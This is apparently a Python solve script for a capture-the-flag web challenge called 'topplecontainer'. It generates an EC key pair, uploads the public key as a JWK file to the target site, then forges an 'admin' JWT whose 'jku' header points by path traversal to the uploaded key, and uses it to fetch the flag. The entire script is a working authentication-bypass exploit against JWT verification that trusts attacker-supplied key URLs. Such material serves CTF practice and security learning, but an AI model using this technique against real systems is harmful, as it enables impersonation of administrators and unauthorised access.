from cryptography.hazmat.primitives.asymmetric import ec
import jwt
import json
from hashlib import sha256
import requests
from io import BytesIO

# generate private key on P256
private_key = ec.generate_private_key(ec.SECP256R1())
public_key = private_key.public_key()
key_data = public_key

# convert to JWK
key = json.loads(jwt.algorithms.ECAlgorithm.to_jwk(key_data))
h = sha256()
h.update(json.dumps(key, sort_keys=True).encode("utf-8"))
kid = h.hexdigest()
key["kid"] = kid
key = {"keys": [key]}


BASE_URL = "https://topplecontainer.tjc.tf"
s = requests.Session()
s.post(BASE_URL + "/register", data={"username": "irrelevant"})

# upload the JWK and store its location
files = {"file": BytesIO(json.dumps(key).encode())}
page = s.post(BASE_URL + "/upload", files=files).text
link = page[page.index('<a href="/view/') + 15 : page.index('">View your file</a>')]
uid = jwt.decode(s.cookies["token"], options={"verify_signature": False})["id"]
# print(requests.get(BASE_URL + "/download/" + link).text)

# create a new token using the JWK we made
forged_token = jwt.encode(
    {"id": "admin"},
    private_key,
    algorithm="ES256",
    headers={"kid": kid, "jku": f"../uploads/{link}"},
)
# get the flag
print(requests.get(BASE_URL + "/flag", cookies={"token": forged_token}).text)
